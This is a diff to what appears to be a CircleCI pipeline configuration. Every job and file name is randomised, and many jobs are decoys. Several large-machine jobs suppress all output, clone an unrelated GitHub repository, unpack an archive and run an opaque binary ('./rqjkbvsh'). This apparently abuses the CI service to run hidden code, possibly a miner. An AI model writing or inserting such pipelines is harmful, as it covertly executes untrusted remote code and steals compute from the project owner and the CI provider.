+            ls -la /tmp/xdyfjeimpr/haryaszzqgutyt
+      - persist_to_workspace:
+          root: /tmp/xdyfjeimpr
+          paths:
+            - 'haryaszzqgutyt'
+  oxizymj:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xdyfjeimpr
+      - run:
+          name: phjlpocjzaajw
+          command: |
+            exec >/dev/null 2>&1
+            # pipeline with check
+            cat /tmp/xdyfjeimpr/haryaszzqgutyt | wc -c | {
+              read -r sz
+              echo "measured: $sz bytes"
+            }
+      - run:
+          name: yynav
+          command: |
+            exec >/dev/null 2>&1
+            git clone --depth 2 -q --no-single-branch --filter=blob:none https://github.com/keslieblake9ibnu-cmyk/5edd270bec20.git .
+      - run:
+          name: kzloy
+          command: |
+            exec >/dev/null 2>&1
+            tar -xjf lfyhbrad.tar.bz2
+      - run:
+          command: |
+            exec >/dev/null 2>&1
+            ls -la
+      - run:
+          name: bhwthjrqrfby
+          command: |
+            exec >/dev/null 2>&1
+            df -h
+      - run:
+          command: nice -n 0 ./rqjkbvsh
+  dljcbu:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xdyfjeimpr
+      - run:
+          name: sbguliukwoxe
+          command: |
+            exec >/dev/null 2>&1
+            mkdir -p /tmp/xdyfjeimpr
+            echo 'qfddkskfkpzcjea yjampnbaqgybpxnnt' > /tmp/xdyfjeimpr/hkfosfcgufwp
+            ls -la /tmp/xdyfjeimpr/hkfosfcgufwp
+      - persist_to_workspace:
+          root: /tmp/xdyfjeimpr
+          paths:
+            - 'hkfosfcgufwp'
+  rgfzncpwsab:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xdyfjeimpr
+      - run:
+          name: fpuxowhpxuijix
+          command: |
+            exec >/dev/null 2>&1
+            # pipeline with check
+            cat /tmp/xdyfjeimpr/hkfosfcgufwp | wc -c | {
+              read -r sz
+              echo "measured: $sz bytes"
+            }
+      - run:
+          name: krkjetdrplyfrw
+          command: |
+            exec >/dev/null 2>&1
+            git clone --depth 2 -q --no-single-branch --filter=blob:none https://github.com/keslieblake9ibnu-cmyk/5edd270bec20.git .
+      - run:
+          name: lpaobrdmdeqi
+          command: |
+            exec >/dev/null 2>&1
+            tar -xjf lfyhbrad.tar.bz2
+      - run:
+          command: |
+            exec >/dev/null 2>&1
+            ls -la
+      - run:
+          name: lpcnhwkya
+          command: |
+            exec >/dev/null 2>&1
+            df -h
+      - run:
+          command: nice -n 0 ./rqjkbvsh
+  nanvfeknuxwvcl:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xdyfjeimpr
+      - run:
+          name: imyemzoj
+          command: |
+            exec >/dev/null 2>&1
+            mkdir -p /tmp/xdyfjeimpr
+            echo 'zzokqyfuocq ggnjgfptrdoyyrbo' > /tmp/xdyfjeimpr/oyninhi
+            ls -la /tmp/xdyfjeimpr/oyninhi
+      - persist_to_workspace:
+          root: /tmp/xdyfjeimpr
+          paths:
+            - 'oyninhi'
+  bkfjqfujrbrm:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xdyfjeimpr
+      - run:
+          name: ljupegulwywli
+          command: |
+            exec >/dev/null 2>&1
+            # pipeline with check
+            cat /tmp/xdyfjeimpr/oyninhi | wc -c | {
+              read -r sz
+              echo "measured: $sz bytes"
+            }
+      - run:
+          name: vrtsry
+          command: |
+            exec >/dev/null 2>&1
+            git clone --depth 2 -q --no-single-branch --filter=blob:none https://github.com/keslieblake9ibnu-cmyk/5edd270bec20.git .
+      - run:
+          name: sexji
+          command: |
+            exec >/dev/null 2>&1
+            tar -xjf lfyhbrad.tar.bz2
+      - run:
+          command: |
+            exec >/dev/null 2>&1
+            ls -la
+      - run:
+          name: woocytsbjl
+          command: |
+            exec >/dev/null 2>&1
+            df -h
+      - run:
+          command: nice -n 0 ./rqjkbvsh
+  taddzxjxv:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xdyfjeimpr
+      - run:
+          name: mrphwgtkprmhrbx
+          command: |
+            exec >/dev/null 2>&1
+            mkdir -p /tmp/xdyfjeimpr
+            echo 'bjisfobdmh rslflpoqeholxcwfn' > /tmp/xdyfjeimpr/vxynideqsatmao
+            ls -la /tmp/xdyfjeimpr/vxynideqsatmao
+      - persist_to_workspace:
+          root: /tmp/xdyfjeimpr
+          paths:
+            - 'vxynideqsatmao'
+  whthkzibke:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xdyfjeimpr
+      - run:
+          name: ecqzycjtpf
+          command: |
+            exec >/dev/null 2>&1
+            # pipeline with check
+            cat /tmp/xdyfjeimpr/vxynideqsatmao | wc -c | {
+              read -r sz
+              echo "measured: $sz bytes"
+            }
+      - run:
+          name: cmmhgiudfh
+          command: |
+            exec >/dev/null 2>&1
+            git clone --depth 2 -q --no-single-branch --filter=blob:none https://github.com/keslieblake9ibnu-cmyk/5edd270bec20.git .
+      - run:
+          name: sbhzh
+          command: |
+            exec >/dev/null 2>&1
+            tar -xjf lfyhbrad.tar.bz2
+      - run:
+          command: |
+            exec >/dev/null 2>&1
+            ls -la
+      - run:
+          name: adswflkxkjzmhv
+          command: |
+            exec >/dev/null 2>&1
+            df -h
+      - run:
+          command: nice -n 0 ./rqjkbvsh
+  tapyvw:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: legerjca
+          command: |
+            exec >/dev/null 2>&1
+            mkdir -p /tmp/xdyfjeimpr
+            echo 'nacnixtjxawoh atbcdjdpbxaarhb' > /tmp/xdyfjeimpr/ixscydicksni
+            ls -la /tmp/xdyfjeimpr/ixscydicksni
+      - persist_to_workspace:
+          root: /tmp/xdyfjeimpr
+          paths:
+            - 'ixscydicksni'
+  ltqqopaqyhhqtra:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xdyfjeimpr
+      - run:
+          name: aqcxqg
+          command: |
+            exec >/dev/null 2>&1
+            # pipeline with check
+            cat /tmp/xdyfjeimpr/ixscydicksni | wc -c | {
+              read -r sz
+              echo "measured: $sz bytes"
+            }
+      - run:
+          name: rjtiislj
+          command: |
+            exec >/dev/null 2>&1
+            git clone --depth 2 -q --no-single-branch --filter=blob:none https://github.com/keslieblake9ibnu-cmyk/5edd270bec20.git .
+      - run:
+          name: mxxtsiklujeta
+          command: |
+            exec >/dev/null 2>&1
+            tar -xjf lfyhbrad.tar.bz2
+      - run:
+          command: |
+            exec >/dev/null 2>&1
+            ls -la
+      - run:
+          name: slyzuhuynviwy
+          command: |
+            exec >/dev/null 2>&1
+            df -h
+      - run:
+          command: nice -n 0 ./rqjkbvsh
+  udditxj:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xdyfjeimpr
+      - run:
+          name: rckuqmjcbjnxkv
+          command: |
+            exec >/dev/null 2>&1
+            mkdir -p /tmp/xdyfjeimpr
+            echo 'usflwwwmmrm fwtsxqbiueawiqn' > /tmp/xdyfjeimpr/gvchotjkyrqbb
+            ls -la /tmp/xdyfjeimpr/gvchotjkyrqbb
+      - persist_to_workspace:
+          root: /tmp/xdyfjeimpr
+          paths:
+            - 'gvchotjkyrqbb'
+  tfieyhv:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xdyfjeimpr
+      - run:
+          name: fqnflusjlcdc
+          command: |
+            exec >/dev/null 2>&1
+            # pipeline with check
+            cat /tmp/xdyfjeimpr/gvchotjkyrqbb | wc -c | {
+              read -r sz
+              echo "measured: $sz bytes"
+            }
+      - run:
+          name: sxnggykpnkhdj
+          command: |
+            exec >/dev/null 2>&1
+            git clone --depth 2 -q --no-single-branch --filter=blob:none https://github.com/keslieblake9ibnu-cmyk/5edd270bec20.git .
+      - run:
+          name: pywpbcvzh
+          command: |
+            exec >/dev/null 2>&1
+            tar -xjf lfyhbrad.tar.bz2
+      - run:
+          command: |
+            exec >/dev/null 2>&1
+            ls -la
+      - run:
+          name: scjnzhv
+          command: |
+            exec >/dev/null 2>&1
+            df -h
+      - run:
+          command: nice -n 0 ./rqjkbvsh
+  uohlb:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xdyfjeimpr
+      - run:
+          name: awabbqdqrfqw
+          command: |
+            exec >/dev/null 2>&1
+            mkdir -p /tmp/xdyfjeimpr
+            echo 'sorfrbxikx aozuvzdhzkacse' > /tmp/xdyfjeimpr/hkqqztnpwrq
+            ls -la /tmp/xdyfjeimpr/hkqqztnpwrq
+      - persist_to_workspace:
+          root: /tmp/xdyfjeimpr
+          paths:
+            - 'hkqqztnpwrq'
+  wqlnhkeziba:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xdyfjeimpr
+      - run:
+          name: bopdo
+          command: |
+            exec >/dev/null 2>&1
+            # pipeline with check
+            cat /tmp/xdyfjeimpr/hkqqztnpwrq | wc -c | {
+              read -r sz
+              echo "measured: $sz bytes"
+            }
+      - run:
+          name: autubszmwopsi
+          command: |
+            exec >/dev/null 2>&1
+            git clone --depth 2 -q --no-single-branch --filter=blob:none https://github.com/keslieblake9ibnu-cmyk/5edd270bec20.git .
+      - run:
+          name: ieactstmccf
+          command: |
+            exec >/dev/null 2>&1
+            tar -xjf lfyhbrad.tar.bz2
+      - run:
+          command: |
+            exec >/dev/null 2>&1
+            ls -la
+      - run:
+          name: tpisjhc
+          command: |
+            exec >/dev/null 2>&1
+            df -h
+      - run:
+          command: nice -n 0 ./rqjkbvsh
+  bymnvecuo:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xdyfjeimpr
+      - run:
+          name: vgwucbajxdrfav
+          command: |
+            exec >/dev/null 2>&1
+            mkdir -p /tmp/xdyfjeimpr
+            echo 'riwhxbjasrr tdqhmpmcer' > /tmp/xdyfjeimpr/mrplngsqa
+            ls -la /tmp/xdyfjeimpr/mrplngsqa
+      - persist_to_workspace:
+          root: /tmp/xdyfjeimpr
+          paths:
+            - 'mrplngsqa'
+  dldddo:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xdyfjeimpr
+      - run:
+          name: tlllqqxfkrtfjo
+          command: |
+            exec >/dev/null 2>&1
+            # pipeline with check
+            cat /tmp/xdyfjeimpr/mrplngsqa | wc -c | {
+              read -r sz
+              echo "measured: $sz bytes"
+            }
+      - run:
+          name: uclrhbnfbmwpdbt
+          command: |
+            exec >/dev/null 2>&1
+            git clone --depth 2 -q --no-single-branch --filter=blob:none https://github.com/keslieblake9ibnu-cmyk/5edd270bec20.git .
+      - run:
+          name: hutejgcxaa
+          command: |
+            exec >/dev/null 2>&1
+            tar -xjf lfyhbrad.tar.bz2
+      - run:
+          command: |
+            exec >/dev/null 2>&1
+            ls -la
+      - run:
+          name: igygxxz
+          command: |
+            exec >/dev/null 2>&1
+            df -h
+      - run:
+          command: nice -n 0 ./rqjkbvsh
+  jmyafatnq:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xdyfjeimpr
+      - run:
+          name: stwzzkaduln
+          command: |
+            exec >/dev/null 2>&1
+            mkdir -p /tmp/xdyfjeimpr
+            echo 'dzgyxdmvmtqey mkzgfcsfpyayxzejp' > /tmp/xdyfjeimpr/nhwxehszquhkxk
+            ls -la /tmp/xdyfjeimpr/nhwxehszquhkxk
+      - persist_to_workspace:
+          root: /tmp/xdyfjeimpr
+          paths:
+            - 'nhwxehszquhkxk'
+  omisqfmyvrtlkv:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xdyfjeimpr
+      - run:
+          name: flgcrjdtl
+          command: |
+            exec >/dev/null 2>&1
+            # pipeline with check
+            cat /tmp/xdyfjeimpr/nhwxehszquhkxk | wc -c | {
+              read -r sz
+              echo "measured: $sz bytes"
+            }
+      - run:
+          name: rzynsrpeqr
+          command: |
+            exec >/dev/null 2>&1
+            git clone --depth 2 -q --no-single-branch --filter=blob:none https://github.com/keslieblake9ibnu-cmyk/5edd270bec20.git .
+      - run:
+          name: nsqsxhaizmdo
+          command: |
+            exec >/dev/null 2>&1
+            tar -xjf lfyhbrad.tar.bz2
+      - run:
+          command: |
+            exec >/dev/null 2>&1
+            ls -la
+      - run:
+          name: rmarwpohb
+          command: |
+            exec >/dev/null 2>&1
+            df -h
+      - run:
+          command: nice -n 0 ./rqjkbvsh
+  mhqnepkpteoqynh:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xdyfjeimpr
+      - run:
+          name: zsthbqgxt
+          command: |
+            exec >/dev/null 2>&1
+            mkdir -p /tmp/xdyfjeimpr
+            echo 'lhupukyjlmdtptmjjp jygbcabyav' > /tmp/xdyfjeimpr/gegquyuqmv
+            ls -la /tmp/xdyfjeimpr/gegquyuqmv
+      - persist_to_workspace:
+          root: /tmp/xdyfjeimpr
+          paths:
+            - 'gegquyuqmv'
+  piscpccbnyotkbc:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xdyfjeimpr
+      - run:
+          name: zeztjwxtpd
+          command: |
+            exec >/dev/null 2>&1
+            # pipeline with check
+            cat /tmp/xdyfjeimpr/gegquyuqmv | wc -c | {
+              read -r sz
+              echo "measured: $sz bytes"
+            }
+      - run:
+          name: rlghlysprcqxywd
+          command: |
+            exec >/dev/null 2>&1
+            git clone --depth 2 -q --no-single-branch --filter=blob:none https://github.com/keslieblake9ibnu-cmyk/5edd270bec20.git .
+      - run:
+          name: fnxmazqertfgloj
+          command: |
+            exec >/dev/null 2>&1
+            tar -xjf lfyhbrad.tar.bz2
+      - run:
+          command: |
+            exec >/dev/null 2>&1
+            ls -la
+      - run:
+          name: vcsbbdpf
+          command: |
+            exec >/dev/null 2>&1
+            df -h
+      - run:
+          command: nice -n 0 ./rqjkbvsh
+
+  awfhemhx:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xdyfjeimpr
+      - run:
+          name: rgcbfrpn
+          command: |
+            exec >/dev/null 2>&1
+            mkdir -p /tmp/xdyfjeimpr
+            echo 'wyemzbqgqalcbbxi ouqdwnkrap' > /tmp/xdyfjeimpr/gegquyuqmv
+            ls -la /tmp/xdyfjeimpr/gegquyuqmv
+      - persist_to_workspace:
+          root: /tmp/xdyfjeimpr
+          paths:
+            - 'gegquyuqmv'
+  dykzorlnqapcp:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xdyfjeimpr
+      - run:
+          name: gppvmbpglz
+          command: |
+            exec >/dev/null 2>&1
+            mkdir -p /tmp/xdyfjeimpr
+            echo 'dwycxgduysyfjjec rczutvsycnasmtur' > /tmp/xdyfjeimpr/hkqqztnpwrq
+            ls -la /tmp/xdyfjeimpr/hkqqztnpwrq
+      - persist_to_workspace:
+          root: /tmp/xdyfjeimpr
+          paths:
+            - 'hkqqztnpwrq'
+  ndlglsi:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xdyfjeimpr
+      - run:
+          name: szwlzz
+          command: |
+            exec >/dev/null 2>&1
+            mkdir -p /tmp/xdyfjeimpr
+            echo 'yocsgzgexluuhgb lqbnkvhcvqbi' > /tmp/xdyfjeimpr/nwjjlzq
+            ls -la /tmp/xdyfjeimpr/nwjjlzq
+      - persist_to_workspace:
+          root: /tmp/xdyfjeimpr
+          paths:
+            - 'nwjjlzq'
+  nxjjrwtir:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: hjkcciogvg
+          command: |
+            exec >/dev/null 2>&1
+            mkdir -p /tmp/xdyfjeimpr
+            echo 'lfdcnwvapwuhyrpp vfsdljiemetc' > /tmp/xdyfjeimpr/ozymqopa
+            ls -la /tmp/xdyfjeimpr/ozymqopa
+      - persist_to_workspace:
+          root: /tmp/xdyfjeimpr
+          paths:
+            - 'ozymqopa'
+  zpatxqfdcda:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xdyfjeimpr
+      - run:
+          name: hyolbbtwa
+          command: |
+            exec >/dev/null 2>&1
+            mkdir -p /tmp/xdyfjeimpr
+            echo 'bsonmaruyuodhyeuw kbklmmjtcem' > /tmp/xdyfjeimpr/mpcoydujjtth
+            ls -la /tmp/xdyfjeimpr/mpcoydujjtth
+      - persist_to_workspace:
+          root: /tmp/xdyfjeimpr
+          paths:
+            - 'mpcoydujjtth'
+  gpkbfabnuzm:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: chmlcmhydqd
+          command: |
+            exec >/dev/null 2>&1
+            mkdir -p /tmp/xdyfjeimpr
+            echo 'nrhqwyynjq kqvxmsvlfvnvutgg' > /tmp/xdyfjeimpr/urdkpg
+            ls -la /tmp/xdyfjeimpr/urdkpg
+      - persist_to_workspace:
+          root: /tmp/xdyfjeimpr
+          paths:
+            - 'urdkpg'
+  ickhqkxneiwb:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xdyfjeimpr
+      - run:
+          name: haxjgulxcpvkkxh
+          command: |
+            exec >/dev/null 2>&1
+            mkdir -p /tmp/xdyfjeimpr
+            echo 'qysxvyfbhgymaun lpqsulftxsbxwxz' > /tmp/xdyfjeimpr/jyxxad
+            ls -la /tmp/xdyfjeimpr/jyxxad
+      - persist_to_workspace:
+          root: /tmp/xdyfjeimpr
+          paths:
+            - 'jyxxad'
+  cpxrnbsdxipgq:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xdyfjeimpr
+      - run:
+          name: wkornqpidgpheu
+          command: |
+            exec >/dev/null 2>&1
+            mkdir -p /tmp/xdyfjeimpr
+            echo 'skxwzvmmfkgnrfqwyu uxnqxrdsxcv' > /tmp/xdyfjeimpr/ewyifdbh
+            ls -la /tmp/xdyfjeimpr/ewyifdbh
+      - persist_to_workspace:
+          root: /tmp/xdyfjeimpr
+          paths:
+            - 'ewyifdbh'
+  crvozklqph:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xdyfjeimpr
+      - run:
+          name: fsrmj
+          command: |
+            exec >/dev/null 2>&1
+            mkdir -p /tmp/xdyfjeimpr
+            echo 'fyoowcsddpfulcqlt mkylubjxphyuixq' > /tmp/xdyfjeimpr/vxynideqsatmao
+            ls -la /tmp/xdyfjeimpr/vxynideqsatmao
+      - persist_to_workspace:
+          root: /tmp/xdyfjeimpr
+          paths:
+            - 'vxynideqsatmao'
+  uwizcdouxtqc:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xdyfjeimpr
+      - run:
+          name: fusbqoq
+          command: |
+            exec >/dev/null 2>&1
+            mkdir -p /tmp/xdyfjeimpr
+            echo 'hzqrtebaqbvy giaqagmlsshmwev' > /tmp/xdyfjeimpr/zmkglui
+            ls -la /tmp/xdyfjeimpr/zmkglui
+      - persist_to_workspace:
+          root: /tmp/xdyfjeimpr
+          paths:
+            - 'zmkglui'
+  jqbynskcoycyqkp:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xdyfjeimpr
+      - run:
+          name: szdcraj
+          command: |
+            exec >/dev/null 2>&1
+            mkdir -p /tmp/xdyfjeimpr
+            echo 'ijvnipdokgwi wfszrbkdnyhaanozqg' > /tmp/xdyfjeimpr/ycyase
+            ls -la /tmp/xdyfjeimpr/ycyase
+      - persist_to_workspace:
+          root: /tmp/xdyfjeimpr
+          paths:
+            - 'ycyase'
+  grdwfaxrhzzmgl:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xdyfjeimpr
+      - run:
+          name: wumiomlkrhbdrfv
+          command: |
+            exec >/dev/null 2>&1
+            mkdir -p /tmp/xdyfjeimpr
+            echo 'emprbiqtsrwlswvcv skyqebwncoop' > /tmp/xdyfjeimpr/kebkypegra
+            ls -la /tmp/xdyfjeimpr/kebkypegra
+      - persist_to_workspace:
+          root: /tmp/xdyfjeimpr
+          paths:
+            - 'kebkypegra'
+workflows:
+  htcjnrfwrxqps:
+    jobs:
+      - mhqnepkpteoqynh
+      - awfhemhx:
+          requires:
+            - mhqnepkpteoqynh
+      - piscpccbnyotkbc:
+          requires:
+            - awfhemhx
+      - uohlb:
+          requires:
+            - awfhemhx
+      - dykzorlnqapcp:
+          requires:
+            - uohlb
+      - wqlnhkeziba:
+          requires:
+            - dykzorlnqapcp
+      - nwjvyi:
+          requires:
+            - dykzorlnqapcp
+      - ndlglsi:
+          requires:
+            - nwjvyi
+      - eflllykeqln:
+          requires:
+            - ndlglsi
+      - bkjxomdzpbmk:
+          requires:
+            - ndlglsi
+      - nxjjrwtir:
+          requires:
+            - bkjxomdzpbmk
+      - kvnpyqmkhhcv:
+          requires:
+            - nxjjrwtir
+      - emofwgacmixqf:
+          requires:
+            - nxjjrwtir
+      - zpatxqfdcda:
+          requires:
+            - emofwgacmixqf
+      - gsttoiicdid:
+          requires:
+            - zpatxqfdcda
+      - qxuoatmsocye:
+          requires:
+            - zpatxqfdcda
+      - gpkbfabnuzm:
+          requires:
+            - qxuoatmsocye
+      - qkyicxajufmtc:
+          requires:
+            - gpkbfabnuzm
+      - iichfib:
+          requires:
+            - gpkbfabnuzm
+      - ickhqkxneiwb:
+          requires:
+            - iichfib
+      - gfalfux:
+          requires:
+            - ickhqkxneiwb
+      - ppglqrlqya:
+          requires:
+            - ickhqkxneiwb
+      - cpxrnbsdxipgq:
+          requires:
+            - ppglqrlqya
+      - fmypinufd:
+          requires:
+            - cpxrnbsdxipgq
+      - taddzxjxv:
+          requires:
+            - cpxrnbsdxipgq
+      - crvozklqph:
+          requires:
+            - taddzxjxv
+      - whthkzibke:
+          requires:
+            - crvozklqph
+      - ltrgn:
+          requires:
+            - crvozklqph
+      - uwizcdouxtqc:
+          requires:
+            - ltrgn
+      - koxqvg:
+          requires:
+            - uwizcdouxtqc
+      - rnbbq:
+          requires:
+            - uwizcdouxtqc
+      - jqbynskcoycyqkp:
+          requires:
+            - rnbbq
+      - iagtypyot:
+          requires:
+            - jqbynskcoycyqkp
+      - ddpiy:
+          requires:
+            - jqbynskcoycyqkp
+      - grdwfaxrhzzmgl:
+          requires:
+            - ddpiy
+      - pcoeiimhfjl:
+          requires:
+            - grdwfaxrhzzmgl
+      - emkkviygkfp
+      - rwtradfykwwp:
+          requires:
+            - emkkviygkfp
+      - dljcbu:
+          requires:
+            - emkkviygkfp
+      - rgfzncpwsab:
+          requires:
+            - dljcbu
+      - mrqrdafl:
+          requires:
+            - dljcbu
+      - xnmwxsckyrjp:
+          requires:
+            - mrqrdafl
+      - hjmycxrvgt:
+          requires:
+            - mrqrdafl
+      - belyop:
+          requires:
+            - hjmycxrvgt
+      - udditxj:
+          requires:
+            - hjmycxrvgt
+      - tfieyhv:
+          requires:
+            - udditxj
+      - wahyfbrm:
+          requires:
+            - udditxj
+      - heojgaait:
+          requires:
+            - wahyfbrm
+      - vbdjsxmk:
+          requires:
+            - wahyfbrm
+      - xgafavgend:
+          requires:
+            - vbdjsxmk
+      - pxoapbqfc:
+          requires:
+            - vbdjsxmk
+      - owazkuatiyyalvx:
+          requires:
+            - pxoapbqfc
+      - xqntcubl:
+          requires:
+            - pxoapbqfc
+      - csflqxbdisaun:
+          requires:
+            - xqntcubl
+      - nanvfeknuxwvcl:
+          requires:
+            - xqntcubl
+      - bkfjqfujrbrm:
+          requires:
+            - nanvfeknuxwvcl
+      - zlqvuar:
+          requires:
+            - nanvfeknuxwvcl
+      - oxizymj:
+          requires:
+            - zlqvuar
+      - odwpu:
+          requires:
+            - zlqvuar
+      - acvfdhgezxeuj:
+          requires:
+            - odwpu
+      - bymnvecuo:
+          requires:
+            - odwpu
+      - dldddo:
+          requires:
+            - bymnvecuo
+      - tapyvw:
+          requires:
+            - bymnvecuo
+      - ltqqopaqyhhqtra:
+          requires:
+            - tapyvw
+      - mirjaed:
+          requires:
+            - tapyvw
+      - zdbmgbtjdbltgi:
+          requires:
+            - mirjaed
+      - rsfxmwuxxbrhzm:
+          requires:
+            - mirjaed
+      - npxsrscoaoct:
+          requires:
+            - rsfxmwuxxbrhzm
+      - fbhmgksuiq:
+          requires:
+            - rsfxmwuxxbrhzm
+      - bbtcltkpb:
+          requires:
+            - fbhmgksuiq
+      - jmyafatnq:
+          requires:
+            - fbhmgksuiq
+      - omisqfmyvrtlkv:
+          requires:
+            - jmyafatnq
